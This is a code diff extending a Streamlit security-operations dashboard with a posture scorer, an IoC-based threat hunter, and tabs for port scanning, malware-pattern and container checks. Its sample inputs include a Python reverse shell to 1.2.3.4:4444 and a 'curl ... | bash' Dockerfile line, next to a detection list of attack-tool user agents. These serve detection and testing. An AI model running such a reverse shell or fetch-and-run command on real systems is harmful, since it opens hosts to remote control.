+            "generated_at": self.generated_at,
+            "top_recommendations": self.recommendations[:5],
+        }
+
+
+class SecurityPostureScorer:
+    """
+    Aggregates findings from all scanning engines into a normalised 0-100
+    security score. Each finding type is weighted by severity and engine
+    reliability. Tracks historical scores for trend analysis.
+    """
+
+    SEVERITY_WEIGHTS = {"Critical": 15, "High": 8, "Medium": 3, "Low": 1, "Info": 0}
+    MAX_DEDUCTION = 100
+
+    def __init__(self):
+        self._history: List[Tuple[str, int]] = []   # (timestamp, score)
+
+    def score(self, code_findings: List[Any], semantic_findings: List[Any],
+               malware_findings: List[MalwareFinding], dep_findings: List[Any],
+               secret_findings: List[SecretFinding], network_events: List[Any],
+               entry_points: List[EntryPoint]) -> PostureScore:
+
+        deductions = 0
+        critical_total = 0
+        high_total = 0
+        category_scores: Dict[str, int] = {
+            "Code Quality": 100, "Secrets": 100, "Dependencies": 100,
+            "Malware": 100, "Network": 100, "Attack Surface": 100,
+        }
+
+        def _deduct(findings: List[Any], category: str, multiplier: float = 1.0) -> int:
+            d = 0
+            for f in findings:
+                sev = getattr(f, "severity", "Low")
+                d += int(self.SEVERITY_WEIGHTS.get(sev, 1) * multiplier)
+            pct = min(d, 50)
+            category_scores[category] = max(0, 100 - pct * 2)
+            return d
+
+        deductions += _deduct(list(code_findings) + list(semantic_findings), "Code Quality")
+        deductions += _deduct(list(secret_findings), "Secrets", 2.0)
+        deductions += _deduct(list(dep_findings), "Dependencies")
+        deductions += _deduct(list(malware_findings), "Malware", 3.0)
+
+        net_deduction = sum(int(getattr(e, "anomaly_score", 0) / 10) for e in network_events)
+        deductions += net_deduction
+        category_scores["Network"] = max(0, 100 - min(net_deduction * 5, 100))
+
+        surface_deduction = sum(e.risk_score for e in entry_points) // 2
+        deductions += surface_deduction
+        category_scores["Attack Surface"] = max(0, 100 - min(surface_deduction * 3, 100))
+
+        critical_total = sum(1 for f in list(code_findings) + list(semantic_findings) +
+                              list(malware_findings) + list(dep_findings)
+                              if getattr(f, "severity", "") == "Critical")
+        high_total = sum(1 for f in list(code_findings) + list(semantic_findings) +
+                          list(malware_findings) + list(dep_findings)
+                          if getattr(f, "severity", "") == "High")
+
+        overall = max(0, 100 - min(deductions // 2, 100))
+
+        if overall >= 90:   grade = "A+"
+        elif overall >= 80: grade = "A"
+        elif overall >= 70: grade = "B"
+        elif overall >= 60: grade = "C"
+        elif overall >= 45: grade = "D"
+        else:               grade = "F"
+
+        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        if self._history:
+            prev = self._history[-1][1]
+            trend = "Improving" if overall > prev + 2 else "Degrading" if overall < prev - 2 else "Stable"
+        else:
+            trend = "First scan"
+        self._history.append((ts, overall))
+
+        recs: List[str] = []
+        if malware_findings:
+            recs.append("🔴 CRITICAL: Malware patterns detected — immediate incident response required.")
+        if secret_findings:
+            recs.append("🔴 Rotate all detected secrets/credentials immediately.")
+        if critical_total > 0:
+            recs.append(f"🟠 Remediate {critical_total} Critical finding(s) within 24-48 hours.")
+        if high_total > 0:
+            recs.append(f"🟡 Address {high_total} High finding(s) in the current sprint.")
+        if category_scores["Dependencies"] < 70:
+            recs.append("📦 Patch vulnerable dependencies identified in the Dependency CVE tab.")
+        if category_scores["Network"] < 80:
+            recs.append("📡 Review high-anomaly network events in the Network Telemetry tab.")
+        if not recs:
+            recs.append("✅ No critical issues detected. Continue regular scanning to maintain posture.")
+
+        return PostureScore(
+            overall=overall, grade=grade, category_scores=category_scores,
+            critical_issues=critical_total, high_issues=high_total,
+            trend=trend, generated_at=ts, recommendations=recs,
+        )
+
+    def history(self) -> List[Tuple[str, int]]:
+        return list(self._history)
+
+
+
+# ==============================================================================
+# ==============================================================================
+#  MODULE: THREAT HUNTER
+#  IoC matching against network telemetry, persistence-pattern detection,
+#  lateral-movement heuristics, and a unified threat timeline.
+# ==============================================================================
+# ==============================================================================
+
+@dataclass
+class IoCMatch:
+    ioc_type: str        # "ip" | "domain" | "hash" | "user_agent"
+    ioc_value: str
+    matched_in: str       # event_id or file reference
+    confidence: str
+    threat_family: str
+    first_seen: str
+
+@dataclass
+class ThreatHuntResult:
+    ioc_matches: List[IoCMatch]
+    persistence_indicators: List[str]
+    lateral_movement_indicators: List[str]
+    beaconing_candidates: List[Dict[str, Any]]
+    overall_threat_level: str
+    hunted_at: str
+
+    def to_dict(self) -> Dict[str, Any]:
+        return {
+            "ioc_matches": [
+                {"type": m.ioc_type, "value": m.ioc_value, "matched_in": m.matched_in,
+                 "confidence": m.confidence, "family": m.threat_family}
+                for m in self.ioc_matches
+            ],
+            "persistence_indicators": self.persistence_indicators,
+            "lateral_movement_indicators": self.lateral_movement_indicators,
+            "beaconing_candidates": self.beaconing_candidates,
+            "overall_threat_level": self.overall_threat_level,
+            "hunted_at": self.hunted_at,
+        }
+
+
+# Small curated IoC feed — in production this would sync from a live threat
+# intel source (MISP, AlienVault OTX, etc.). Kept local/static here since
+# this sandbox has no persistent network access to a live feed.
+KNOWN_MALICIOUS_IOCS: Dict[str, Dict[str, str]] = {
+    "185.220.101.5":  {"type": "ip", "family": "TOR Exit Node", "confidence": "Medium"},
+    "45.33.21.90":    {"type": "ip", "family": "Known Scanner Infrastructure", "confidence": "Medium"},
+    "89.248.167.131": {"type": "ip", "family": "Known Botnet C2", "confidence": "High"},
+    "194.26.29.156":  {"type": "ip", "family": "Known Malicious Range", "confidence": "Medium"},
+    "91.240.118.172": {"type": "ip", "family": "Known Malicious Range", "confidence": "Medium"},
+}
+
+SUSPICIOUS_USER_AGENTS: List[str] = [
+    "sqlmap", "nikto", "nmap", "masscan", "curl/7", "python-requests",
+    "gobuster", "wpscan", "dirbuster", "hydra", "metasploit",
+]
+
+
+class ThreatHunter:
+    """
+    Correlates network telemetry against a curated IoC feed, detects
+    persistence/lateral-movement patterns in log payloads, and identifies
+    beaconing candidates (regular time-interval connections to the same
+    destination — a classic C2 communication signature).
+    """
+
+    def __init__(self, ioc_feed: Optional[Dict[str, Dict[str, str]]] = None):
+        self.ioc_feed = ioc_feed or KNOWN_MALICIOUS_IOCS
+
+    def _match_iocs(self, events: List[Any]) -> List[IoCMatch]:
+        matches: List[IoCMatch] = []
+        for event in events:
+            ip = getattr(event, "source_ip", "")
+            if ip in self.ioc_feed:
+                info = self.ioc_feed[ip]
+                matches.append(IoCMatch(
+                    ioc_type=info["type"], ioc_value=ip,
+                    matched_in=getattr(event, "event_id", "?"),
+                    confidence=info["confidence"], threat_family=info["family"],
+                    first_seen=datetime.fromtimestamp(getattr(event, "timestamp", time.time())).strftime("%Y-%m-%d %H:%M:%S"),
+                ))
+            payload = getattr(event, "raw_payload", "").lower()
+            for ua in SUSPICIOUS_USER_AGENTS:
+                if ua in payload:
+                    matches.append(IoCMatch(
+                        ioc_type="user_agent", ioc_value=ua,
+                        matched_in=getattr(event, "event_id", "?"),
+                        confidence="High", threat_family="Reconnaissance/Attack Tooling",
+                        first_seen=datetime.fromtimestamp(getattr(event, "timestamp", time.time())).strftime("%Y-%m-%d %H:%M:%S"),
+                    ))
+        return matches
+
+    def _detect_persistence(self, malware_findings: List[MalwareFinding]) -> List[str]:
+        indicators = []
+        for f in malware_findings:
+            if f.category in ("Backdoor",):
+                indicators.append(f"{f.pattern_name} in {f.file_name}:{f.line_number}")
+        return indicators
+
+    def _detect_lateral_movement(self, events: List[Any]) -> List[str]:
+        indicators = []
+        internal_targets: Dict[str, Set[str]] = {}
+        for event in events:
+            ip = getattr(event, "source_ip", "")
+            asset = getattr(event, "target_asset", "")
+            if ip and asset:
+                internal_targets.setdefault(ip, set()).add(asset)
+        for ip, assets in internal_targets.items():
+            if len(assets) >= 3:
+                indicators.append(
+                    f"Source {ip} accessed {len(assets)} distinct internal assets "
+                    f"({', '.join(sorted(assets))}) — possible lateral movement/reconnaissance."
+                )
+        return indicators
+
+    def _detect_beaconing(self, events: List[Any]) -> List[Dict[str, Any]]:
+        """Groups events by source IP + target and looks for near-regular time intervals."""
+        by_pair: Dict[Tuple[str, str], List[float]] = {}
+        for event in events:
+            key = (getattr(event, "source_ip", ""), getattr(event, "target_asset", ""))
+            by_pair.setdefault(key, []).append(getattr(event, "timestamp", 0.0))
+
+        candidates = []
+        for (ip, asset), timestamps in by_pair.items():
+            if len(timestamps) < 3:
+                continue
+            timestamps.sort()
+            intervals = [timestamps[i+1] - timestamps[i] for i in range(len(timestamps) - 1)]
+            if not intervals:
+                continue
+            avg_interval = sum(intervals) / len(intervals)
+            variance = sum((iv - avg_interval) ** 2 for iv in intervals) / len(intervals)
+            std_dev = variance ** 0.5
+            # Low variance relative to mean = regular interval = possible beaconing
+            if avg_interval > 0 and (std_dev / avg_interval) < 0.15 and len(timestamps) >= 3:
+                candidates.append({
+                    "source_ip": ip, "target": asset,
+                    "connection_count": len(timestamps),
+                    "avg_interval_seconds": round(avg_interval, 1),
+                    "regularity": "High" if (std_dev / avg_interval) < 0.05 else "Medium",
+                })
+        return candidates
+
+    def hunt(self, events: List[Any], malware_findings: List[MalwareFinding]) -> ThreatHuntResult:
+        ioc_matches = self._match_iocs(events)
+        persistence = self._detect_persistence(malware_findings)
+        lateral = self._detect_lateral_movement(events)
+        beaconing = self._detect_beaconing(events)
+
+        high_conf_iocs = sum(1 for m in ioc_matches if m.confidence == "High")
+        if high_conf_iocs > 0 or persistence:
+            level = "Critical"
+        elif ioc_matches or lateral or beaconing:
+            level = "High"
+        elif events:
+            level = "Low"
+        else:
+            level = "None"
+
+        return ThreatHuntResult(
+            ioc_matches=ioc_matches, persistence_indicators=persistence,
+            lateral_movement_indicators=lateral, beaconing_candidates=beaconing,
+            overall_threat_level=level, hunted_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        )
+
+
+# ==============================================================================
 # SECTION 9: STREAMLIT DARK "SOC COMMAND CENTER" UI
 # ==============================================================================
 
@@ -4299,6 +5841,51 @@ if "secret_findings" not in st.session_state:
 if "sbom_report" not in st.session_state:
     st.session_state.sbom_report = None
 
+if "network_scanner" not in st.session_state:
+    st.session_state.network_scanner = AdvancedNetworkScanner()
+
+if "malware_scanner" not in st.session_state:
+    st.session_state.malware_scanner = MalwarePatternScanner()
+
+if "container_analyzer" not in st.session_state:
+    st.session_state.container_analyzer = ContainerSecurityAnalyzer()
+
+if "compliance_auditor" not in st.session_state:
+    st.session_state.compliance_auditor = ComplianceAuditor()
+
+if "code_quality_engine" not in st.session_state:
+    st.session_state.code_quality_engine = CodeQualityEngine()
+
+if "attack_surface_mapper" not in st.session_state:
+    st.session_state.attack_surface_mapper = AttackSurfaceMapper()
+
+if "posture_scorer" not in st.session_state:
+    st.session_state.posture_scorer = SecurityPostureScorer()
+
+if "threat_hunter" not in st.session_state:
+    st.session_state.threat_hunter = ThreatHunter()
+
+if "network_scan_results" not in st.session_state:
+    st.session_state.network_scan_results = None
+
+if "malware_findings" not in st.session_state:
+    st.session_state.malware_findings = []
+
+if "container_findings" not in st.session_state:
+    st.session_state.container_findings = []
+
+if "compliance_reports" not in st.session_state:
+    st.session_state.compliance_reports = []
+
+if "quality_reports" not in st.session_state:
+    st.session_state.quality_reports = []
+
+if "entry_points" not in st.session_state:
+    st.session_state.entry_points = []
+
+if "posture_history_scores" not in st.session_state:
+    st.session_state.posture_history_scores = []
+
 if "semantic_findings" not in st.session_state:
     st.session_state.semantic_findings = []
 
@@ -4321,6 +5908,17 @@ jwt_analyzer_engine = st.session_state.jwt_analyzer
 ssl_analyzer_engine = st.session_state.ssl_analyzer
 sbom_gen = st.session_state.sbom_generator
 secret_findings = st.session_state.secret_findings
+network_scanner = st.session_state.network_scanner
+malware_scanner = st.session_state.malware_scanner
+container_analyzer = st.session_state.container_analyzer
+compliance_auditor = st.session_state.compliance_auditor
+code_quality_engine = st.session_state.code_quality_engine
+attack_surface_mapper = st.session_state.attack_surface_mapper
+posture_scorer = st.session_state.posture_scorer
+threat_hunter = st.session_state.threat_hunter
+malware_findings = st.session_state.malware_findings
+container_findings = st.session_state.container_findings
+entry_points = st.session_state.entry_points
 
 # ---- Header ----
 st.markdown(
@@ -4381,13 +5979,22 @@ m4.metric("Semantic (AST/Taint) Findings", len(semantic_findings))
 m5.metric("Dependency CVEs", len(dep_findings))
 m6.metric("Containment Actions", len(containment.get_action_history()))
 
+m7, m8, m9, m10, m11, m12 = st.columns(6)
+m7.metric("Malware Patterns", len(malware_findings))
+m8.metric("Secrets Found", len(secret_findings))
+m9.metric("Container Findings", len(container_findings))
+m10.metric("Attack Surface", len(entry_points))
+m11.metric("Compliance Reports", len(st.session_state.compliance_reports))
+m12.metric("Posture Score", st.session_state.posture_history_scores[-1].overall
+           if st.session_state.posture_history_scores else "—")
+
 st.markdown("---")
 
-tab_dash, tab_code, tab_semantic, tab_deps, tab_net, tab_ai, tab_contain, tab_compliance, tab_assets, tab_exec, tab_livedef, tab_report = st.tabs([
+tab_dash, tab_code, tab_semantic, tab_deps, tab_net, tab_ai, tab_contain, tab_compliance, tab_assets, tab_exec, tab_livedef, tab_advanced, tab_report = st.tabs([
     "📊 Dashboard", "🔍 Code Scanner", "🧬 Semantic Scanner (AST/Taint)", "📦 Dependency CVEs",
     "📡 Network Telemetry", "🤖 AI Deep Triage", "⚡ Containment",
     "📋 Compliance Mapping", "🗄️ Asset Inventory", "📈 Executive Summary",
-    "🛡️ Live Defense & Auto-Fix", "📄 Reports",
+    "🛡️ Live Defense & Auto-Fix", "🎯 Advanced Threat Ops", "📄 Reports",
 ])
 
 # ------------------------------------------------------------------------
@@ -5294,6 +6901,399 @@ with tab_livedef:
 # ------------------------------------------------------------------------
 # TAB: REPORTS
 # ------------------------------------------------------------------------
+# ------------------------------------------------------------------------
+# TAB: ADVANCED THREAT OPS
+# ------------------------------------------------------------------------
+with tab_advanced:
+    st.markdown("### 🎯 Advanced Threat Ops")
+    st.caption(
+        "8 modules: Network Port Scanner, Malware Pattern Detector, Container Security, "
+        "Compliance Auditor, Code Quality Metrics, Attack Surface Mapper, "
+        "Security Posture Scorer, and Threat Hunter."
+    )
+
+    adv_net, adv_mal, adv_cont, adv_comp, adv_qual, adv_surf, adv_posture, adv_hunt = st.tabs([
+        "🔌 Port Scanner", "🦠 Malware Detector", "🐳 Container Security",
+        "📜 Compliance Auditor", "📐 Code Quality", "🗺️ Attack Surface",
+        "🎯 Posture Score", "🕵️ Threat Hunter",
+    ])
+
+    # ── PORT SCANNER ──────────────────────────────────────────────────────────
+    with adv_net:
+        st.markdown("#### 🔌 Advanced Network Port Scanner")
+        st.warning("⚠️ Only scan hosts you own or have written permission to test.")
+        st.caption(f"Checks {len(WELL_KNOWN_SERVICES)} well-known ports with service fingerprinting, "
+                   f"banner grabbing, and structured risk scoring.")
+
+        net_col1, net_col2 = st.columns([3, 1])
+        with net_col1:
+            net_target = st.text_input("Target host or IP", value="127.0.0.1", key="net_target")
+        with net_col2:
+            net_timeout = st.slider("Timeout (s)", 0.5, 5.0, 2.0, 0.5, key="net_timeout")
+
+        port_mode = st.radio("Port range", ["Well-known ports (fast)", "Custom port list"],
+                             horizontal=True, key="port_mode")
+        custom_ports_str = ""
+        if port_mode == "Custom port list":
+            custom_ports_str = st.text_input("Comma-separated ports", value="22,80,443,3306,6379,8080", key="custom_ports")
+
+        if st.button("🔌 Run Port Scan", type="primary", key="run_port_scan"):
+            valid, kind = network_scanner.validate_target(net_target.strip())
+            if not valid:
+                st.error(f"Invalid target: '{net_target}'")
+            else:
+                if kind == "public":
+                    st.warning(f"⚠️ '{net_target}' resolves as a public address. "
+                              "Confirm you have permission to scan this host before proceeding.")
+                ports_to_scan = None
+                if port_mode == "Custom port list" and custom_ports_str.strip():
+                    try:
+                        ports_to_scan = [int(p.strip()) for p in custom_ports_str.split(",") if p.strip()]
+                    except ValueError:
+                        st.error("Invalid port list — use comma-separated integers.")
+                        ports_to_scan = list(WELL_KNOWN_SERVICES.keys())[:20]
+                with st.spinner(f"Scanning {net_target}..."):
+                    report = network_scanner.scan_host(net_target.strip(), ports=ports_to_scan, timeout=net_timeout)
+                st.session_state.network_scan_results = report
+
+        net_report = st.session_state.network_scan_results
+        if net_report:
+            n1, n2, n3, n4 = st.columns(4)
+            n1.metric("Ports Scanned", net_report.total_scanned)
+            n2.metric("Open Ports", len(net_report.open_ports))
+            n3.metric("Critical Risk", net_report.critical_count)
+            n4.metric("Overall Risk", net_report.overall_risk)
+
+            if net_report.open_ports:
+                df_ports = pd.DataFrame([p.to_dict() for p in net_report.open_ports])
+                st.dataframe(df_ports, use_container_width=True, height=320)
+
+                for p in sorted(net_report.open_ports, key=lambda x: {"Critical":0,"High":1,"Medium":2,"Low":3,"OK":4}.get(x.risk_level,5)):
+                    if p.risk_level in ("Critical", "High"):
+                        st.markdown(f"- **{p.risk_level}** — Port {p.port} ({p.service_name}): {p.risk_note}")
+            else:
+                st.success("No open ports found in the scanned range.")
+
+    # ── MALWARE DETECTOR ─────────────────────────────────────────────────────
+    with adv_mal:
+        st.markdown("#### 🦠 Malware & Obfuscation Pattern Detector")
+        st.caption(f"Scans for reverse shells, obfuscated payloads, cryptominers, backdoors, "
+                   f"data exfiltration, and privilege escalation patterns across "
+                   f"{len(MALWARE_PATTERNS)} curated signatures.")
+
+        mal_mode = st.radio("Input", ["Paste code", "Upload file(s)"], horizontal=True, key="mal_mode")
+        mal_files: Dict[str, str] = {}
+
+        if mal_mode == "Paste code":
+            mal_name = st.text_input("File name", value="suspicious.py", key="mal_name")
+            mal_code = st.text_area("Paste code to scan for malware patterns", height=200, key="mal_code",
+                value='import socket\ns = socket.socket()\ns.connect(("1.2.3.4", 4444))\nwhile True:\n    cmd = s.recv(1024)\n    exec(cmd)\n')
+            if mal_code.strip():
+                mal_files[mal_name] = mal_code
+        else:
+            mal_uploaded = st.file_uploader("Upload files to scan", accept_multiple_files=True, key="mal_upload")
+            if mal_uploaded:
+                for uf in mal_uploaded:
+                    mal_files[uf.name] = uf.read().decode("utf-8", errors="ignore")
+
+        if st.button("🦠 Scan for Malware Patterns", type="primary", key="run_mal_scan") and mal_files:
+            with st.spinner("Scanning for malicious patterns..."):
+                new_mal_findings = malware_scanner.scan_files(mal_files)
+            st.session_state.malware_findings = new_mal_findings
+            malware_findings = new_mal_findings
+
+        if malware_findings:
+            st.error(f"⚠️ {len(malware_findings)} malware-indicative pattern(s) found!")
+            mal_df = pd.DataFrame([f.to_dict() for f in malware_findings])
+            st.dataframe(mal_df[["file_name","line_number","pattern","category","severity"]],
+                        use_container_width=True, height=250)
+
+            for f in malware_findings:
+                with st.expander(f"🔴 {f.pattern_name} [{f.category}] — {f.file_name}:{f.line_number}"):
+                    st.code(f.matched_snippet, language="python")
+                    st.markdown(f"**Explanation:** {f.explanation}")
+                    st.markdown(f"**Recommendation:** {f.recommendation}")
+        else:
+            st.info("No malware patterns detected yet — paste code or upload files and scan.")
+
+    # ── CONTAINER SECURITY ────────────────────────────────────────────────────
+    with adv_cont:
+        st.markdown("#### 🐳 Container Security Analyzer")
+        st.caption(f"Analyzes Dockerfiles, docker-compose.yml, and Kubernetes manifests across "
+                   f"{len(DOCKERFILE_CHECKS) + len(COMPOSE_CHECKS) + len(K8S_CHECKS)} checks.")
+
+        cont_mode = st.radio("Input", ["Paste Dockerfile", "Paste docker-compose.yml", "Upload file(s)"],
+                             horizontal=True, key="cont_mode")
+        cont_files: Dict[str, str] = {}
+
+        if cont_mode == "Paste Dockerfile":
+            cont_code = st.text_area("Paste Dockerfile content", height=200, key="cont_code",
+                value='FROM python:latest\nUSER root\nENV API_SECRET=hardcoded_value_123\nRUN curl http://example.com/install.sh | bash\nEXPOSE 22\n')
+            if cont_code.strip():
+                cont_files["Dockerfile"] = cont_code
+        elif cont_mode == "Paste docker-compose.yml":
+            cont_code = st.text_area("Paste docker-compose.yml content", height=200, key="cont_compose_code",
+                value='services:\n  web:\n    image: myapp\n    privileged: true\n    network_mode: host\n    environment:\n      - DB_PASSWORD=hardcoded123\n')
+            if cont_code.strip():
+                cont_files["docker-compose.yml"] = cont_code
+        else:
+            cont_uploaded = st.file_uploader("Upload Dockerfile / docker-compose.yml / K8s manifests",
+                                              accept_multiple_files=True, key="cont_upload")
+            if cont_uploaded:
+                for uf in cont_uploaded:
+                    cont_files[uf.name] = uf.read().decode("utf-8", errors="ignore")
+
+        if st.button("🐳 Run Container Security Scan", type="primary", key="run_cont_scan") and cont_files:
+            with st.spinner("Running container security checks..."):
+                new_cont_findings = container_analyzer.analyze_files(cont_files)
+            st.session_state.container_findings = new_cont_findings
+            container_findings = new_cont_findings
+
+        if container_findings:
+            st.markdown(f"**{len(container_findings)} finding(s):**")
+            cont_df = pd.DataFrame([f.to_dict() for f in container_findings])
+            st.dataframe(cont_df[["file_name","check_id","title","severity","category"]],
+                        use_container_width=True, height=280)
+
+            for f in sorted(container_findings, key=lambda x: {"Critical":0,"High":1,"Medium":2,"Low":3}.get(x.severity,4)):
+                with st.expander(f"[{f.severity}] {f.check_id} — {f.title}"):
+                    st.markdown(f"**Detail:** {f.detail}")
+                    st.markdown(f"**Recommendation:** {f.recommendation}")
+        else:
+            st.info("No container files scanned yet.")
+
+    # ── COMPLIANCE AUDITOR ────────────────────────────────────────────────────
+    with adv_comp:
+        st.markdown("#### 📜 Compliance Auditor")
+        st.caption("Maps findings from Code Scanner, Semantic Scanner, Dependency CVEs, and "
+                   "Malware Detector onto PCI-DSS, HIPAA, SOC 2, GDPR, NIST CSF, and ISO 27001.")
+
+        fw_choice = st.selectbox("Framework", ["All Frameworks"] + [fw.value for fw in ComplianceFramework],
+                                 key="fw_choice")
+
+        if st.button("📜 Run Compliance Audit", type="primary", key="run_comp_audit"):
+            selected_fw = None
+            if fw_choice != "All Frameworks":
+                selected_fw = next(fw for fw in ComplianceFramework if fw.value == fw_choice)
+            with st.spinner("Mapping findings to compliance controls..."):
+                reports = compliance_auditor.audit(
+                    findings, malware_findings, semantic_findings, dep_findings,
+                    framework=selected_fw,
+                )
+            st.session_state.compliance_reports = reports
+
+        comp_reports = st.session_state.compliance_reports
+        if comp_reports:
+            for report in comp_reports:
+                st.markdown(f"##### {report.framework.value}")
+                c1, c2, c3, c4 = st.columns(4)
+                c1.metric("Pass Rate", f"{report.pass_rate:.0f}%")
+                c2.metric("Gaps", report.gaps)
+                c3.metric("Partial", report.partial)
+                c4.metric("Passed", report.passed)
+
+                gap_df = pd.DataFrame([
+                    {"Control": g.control.control_id, "Title": g.control.title,
+                     "Status": g.status, "Risk": g.risk_rating, "Evidence": len(g.evidence)}
+                    for g in report.gap_details
+                ])
+                st.dataframe(gap_df, use_container_width=True, height=250)
+
+                for g in report.gap_details:
+                    if g.status == "GAP":
+                        with st.expander(f"🔴 {g.control.control_id} — {g.control.title}"):
+                            st.markdown(f"**Description:** {g.control.description}")
+                            st.markdown(f"**Remediation:** {g.control.remediation_guidance}")
+                            if g.evidence:
+                                st.markdown(f"**Evidence:** {', '.join(g.evidence[:5])}")
+                st.markdown("---")
+        else:
+            st.info("Run an audit above — it uses findings already gathered in other tabs.")
+
+    # ── CODE QUALITY ──────────────────────────────────────────────────────────
+    with adv_qual:
+        st.markdown("#### 📐 Code Quality Metrics Engine")
+        st.caption("Cyclomatic complexity, maintainability index, nesting depth, and "
+                   "duplicate-block detection for Python source files.")
+
+        qual_mode = st.radio("Input", ["Paste code", "Upload file(s)"], horizontal=True, key="qual_mode")
+        qual_files: Dict[str, str] = {}
+
+        if qual_mode == "Paste code":
+            qual_name = st.text_input("File name", value="module.py", key="qual_name")
+            qual_code = st.text_area("Paste Python code", height=200, key="qual_code",
+                value=SAMPLE_VULNERABLE_CODE)
+            if qual_code.strip():
+                qual_files[qual_name] = qual_code
+        else:
+            qual_uploaded = st.file_uploader("Upload .py files", accept_multiple_files=True,
+                                              type=["py"], key="qual_upload")
+            if qual_uploaded:
+                for uf in qual_uploaded:
+                    qual_files[uf.name] = uf.read().decode("utf-8", errors="ignore")
+
+        if st.button("📐 Analyze Code Quality", type="primary", key="run_qual_scan") and qual_files:
+            reports = []
+            with st.spinner("Computing metrics..."):
+                for fname, content in qual_files.items():
+                    r = code_quality_engine.analyze(fname, content)
+                    if r:
+                        reports.append(r)
+            st.session_state.quality_reports = reports
+
+        qual_reports = st.session_state.quality_reports
+        if qual_reports:
+            for report in qual_reports:
+                st.markdown(f"##### `{report.file_name}` — Grade: {report.overall_grade}")
+                q1, q2, q3, q4 = st.columns(4)
+                q1.metric("Maintainability Index", f"{report.maintainability_index:.0f}/100")
+                q2.metric("Avg Complexity", f"{report.avg_complexity:.1f}")
+                q3.metric("Max Complexity", report.max_complexity)
+                q4.metric("Duplicate Blocks", report.duplicate_block_count)
+
+                if report.functions:
+                    func_df = pd.DataFrame([f.to_dict() for f in report.functions])
+                    st.dataframe(func_df, use_container_width=True, height=250)
+
+                    high_risk = [f for f in report.functions if f.risk_level in ("High", "Critical")]
+                    if high_risk:
+                        st.markdown("**High-complexity functions (review priority):**")
+                        for f in high_risk:
+                            st.markdown(f"- `{f.name}()` — complexity {f.cyclomatic_complexity}, "
+                                       f"{f.line_count} lines, nesting depth {f.nested_depth}")
+                st.markdown("---")
+        else:
+            st.info("Paste or upload Python code above and run the analysis.")
+
+    # ── ATTACK SURFACE ────────────────────────────────────────────────────────
+    with adv_surf:
+        st.markdown("#### 🗺️ Attack Surface Mapper")
+        st.caption("Enumerates HTTP routes, CLI arguments, environment variables, and network "
+                   "listeners as external entry points, scored by exposure level.")
+
+        surf_mode = st.radio("Input", ["Paste code", "Upload file(s)"], horizontal=True, key="surf_mode")
+        surf_files: Dict[str, str] = {}
+
+        if surf_mode == "Paste code":
+            surf_name = st.text_input("File name", value="app.py", key="surf_name")
+            surf_code = st.text_area("Paste Python code", height=200, key="surf_code",
+                value='from flask import Flask, request\napp = Flask(__name__)\n\n@app.route("/api/users", methods=["GET", "POST"])\ndef users(request):\n    return "ok"\n\n@app.route("/api/admin", methods=["POST"])\ndef admin(request):\n    return "ok"\n\nimport os\nDB_URL = os.environ.get("DATABASE_URL")\n')
+            if surf_code.strip():
+                surf_files[surf_name] = surf_code
+        else:
+            surf_uploaded = st.file_uploader("Upload .py files", accept_multiple_files=True,
+                                              type=["py"], key="surf_upload")
+            if surf_uploaded:
+                for uf in surf_uploaded:
+                    surf_files[uf.name] = uf.read().decode("utf-8", errors="ignore")
+
+        if st.button("🗺️ Map Attack Surface", type="primary", key="run_surf_scan") and surf_files:
+            with st.spinner("Enumerating entry points..."):
+                new_eps = attack_surface_mapper.analyze_files(surf_files)
+            st.session_state.entry_points = new_eps
+            entry_points = new_eps
+
+        if entry_points:
+            surface_score = attack_surface_mapper.surface_score(entry_points)
+            s1, s2, s3 = st.columns(3)
+            s1.metric("Entry Points Found", len(entry_points))
+            s2.metric("Internet-Facing", sum(1 for e in entry_points if e.exposed_to == "internet"))
+            s3.metric("Surface Risk Score", f"{surface_score}/100")
+
+            ep_df = pd.DataFrame([e.to_dict() for e in entry_points])
+            st.dataframe(ep_df, use_container_width=True, height=300)
+        else:
+            st.info("Paste or upload Python code above and run the mapping.")
+
+    # ── POSTURE SCORE ─────────────────────────────────────────────────────────
+    with adv_posture:
+        st.markdown("#### 🎯 Security Posture Score")
+        st.caption("Aggregates findings from every engine in this app into a single 0-100 score.")
+
+        if st.button("🎯 Calculate Posture Score", type="primary", key="run_posture"):
+            with st.spinner("Aggregating findings across all engines..."):
+                posture = posture_scorer.score(
+                    findings, semantic_findings, malware_findings, dep_findings,
+                    secret_findings, events, entry_points,
+                )
+            st.session_state.posture_history_scores.append(posture)
+
+        history = st.session_state.posture_history_scores
+        if history:
+            latest = history[-1]
+            grade_class = {"A+": "neon-green", "A": "neon-green", "B": "neon-cyan",
+                          "C": "neon-amber", "D": "neon-red", "F": "neon-red"}.get(latest.grade, "neon-cyan")
+
+            p1, p2, p3, p4 = st.columns(4)
+            p1.metric("Overall Score", f"{latest.overall}/100")
+            p2.metric("Grade", latest.grade)
+            p3.metric("Trend", latest.trend)
+            p4.metric("Critical Issues", latest.critical_issues)
+
+            cat_df = pd.DataFrame(list(latest.category_scores.items()), columns=["Category", "Score"])
+            fig_cat = px.bar(cat_df, x="Category", y="Score", color="Score",
+                             color_continuous_scale=["#f87171","#fbbf24","#34d399"], height=300)
+            fig_cat.update_layout(paper_bgcolor="rgba(0,0,0,0)", plot_bgcolor="#111827",
+                                  font_color="#c9d1d9", yaxis=dict(range=[0,100]))
+            st.plotly_chart(fig_cat, use_container_width=True)
+
+            st.markdown("**Top recommendations:**")
+            for rec in latest.recommendations:
+                st.markdown(f"- {rec}")
+
+            if len(history) > 1:
+                trend_df = pd.DataFrame([{"Scan": i+1, "Score": h.overall} for i, h in enumerate(history)])
+                fig_trend = px.line(trend_df, x="Scan", y="Score", markers=True, height=250)
+                fig_trend.update_layout(paper_bgcolor="rgba(0,0,0,0)", plot_bgcolor="#111827",
+                                        font_color="#c9d1d9", yaxis=dict(range=[0,100]))
+                st.plotly_chart(fig_trend, use_container_width=True)
+        else:
+            st.info("Click 'Calculate Posture Score' — it aggregates findings already gathered elsewhere in this app.")
+
+    # ── THREAT HUNTER ─────────────────────────────────────────────────────────
+    with adv_hunt:
+        st.markdown("#### 🕵️ Threat Hunter")
+        st.caption(f"Correlates network telemetry against a {len(KNOWN_MALICIOUS_IOCS)}-entry IoC feed, "
+                   "detects persistence/lateral-movement indicators, and identifies beaconing candidates.")
+
+        if st.button("🕵️ Run Threat Hunt", type="primary", key="run_hunt"):
+            with st.spinner("Hunting for indicators of compromise..."):
+                hunt_result = threat_hunter.hunt(events, malware_findings)
+
+            h1, h2, h3 = st.columns(3)
+            h1.metric("IoC Matches", len(hunt_result.ioc_matches))
+            h2.metric("Threat Level", hunt_result.overall_threat_level)
